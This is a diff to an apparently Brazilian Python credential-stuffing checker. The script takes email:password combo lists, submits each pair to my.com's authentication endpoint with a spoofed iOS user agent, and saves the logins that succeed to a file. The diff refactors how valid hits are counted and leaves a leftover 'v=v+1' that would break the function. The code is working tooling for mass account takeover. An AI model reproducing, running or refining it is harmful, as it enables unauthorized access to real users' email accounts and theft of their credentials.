@@ -66,7 +66,7 @@ print(f'''{AG} Testando credenciais, aguarde...
 ''')
 ldb=len(db)
 
-def checker(email, senha, c, v, ldb, txt):
+def checker(email, senha, c, ldb, txt):
     acesso=requests.get('https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login='+email+'&Password='+senha, headers={'User-Agent': 'MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0'}).text
     if ('Ok=1') in acesso:
         v=v+1
@@ -80,7 +80,6 @@ def checker(email, senha, c, v, ldb, txt):
           chk.write(email+':'+senha)
         print()
         
-v=0
 c=0        
 for combo in db:
   if (':') in combo:
@@ -92,12 +91,13 @@ for combo in db:
     email=combo.split('|')[0]
     senha=combo.split('|')[1]
     c=c+1
-    checker(email, senha, c, v, ldb, txt)
+    checker(email, senha, c, ldb, txt)
   else:
     print(f'{MR}Combo inválido: '+R+combo+C)
-print(f'{IB} Operação finalizada: '+B+str(ldb)+' e-mails verificados; '+G+str(v)+C+' credenciais válidas.')
+v=len(open(txt+'.txt', 'r').read().splitlines())
+print(f'{IB} Operação finalizada: '+B+str(ldb)+C+' e-mails verificados; '+G+str(v)+C+' credenciais válidas.')
 print()
 print(f'{MG} Arquivo salvo em: '+B+txt+'.txt'); time.sleep(2)
 print()
-print(f'''{C}Me acompanhe no Github: {G}https://github.com/p0isonBR
+print(f'''{EG} Me acompanhe no Github: {G}https://github.com/p0isonBR
 {C}''')
